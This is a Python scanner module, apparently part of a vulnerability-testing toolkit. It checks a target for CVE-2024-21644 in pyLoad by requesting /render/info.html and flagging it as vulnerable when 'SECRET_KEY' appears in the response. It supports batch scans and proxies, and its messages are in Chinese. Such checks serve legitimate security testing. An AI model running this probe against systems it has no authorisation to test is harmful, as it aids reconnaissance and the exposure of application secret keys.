#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from libs.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings()
class Cve_2024_21644:
    def get_url(self,input_url):
        try:
            url = input_url + "/render/info.html"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "SECRET_KEY" in req.text:
                OutPrintInfoSuc("Pyload", f'目标存在CVE-2024-21644配置信息泄露漏洞: {url}')
                if self.batch:
                    OutPutFile("pyload_2024_21644.txt",f'目标存在CVE-2024-21644配置信息泄露漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Pyload", f'目标不存在CVE-2024-21644配置信息泄露漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Pyload",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("Pyload", '开始检测CVE-2024-21644配置信息泄露漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("Pyload", 'CVE-2024-21644配置信息泄露漏洞检测结束')



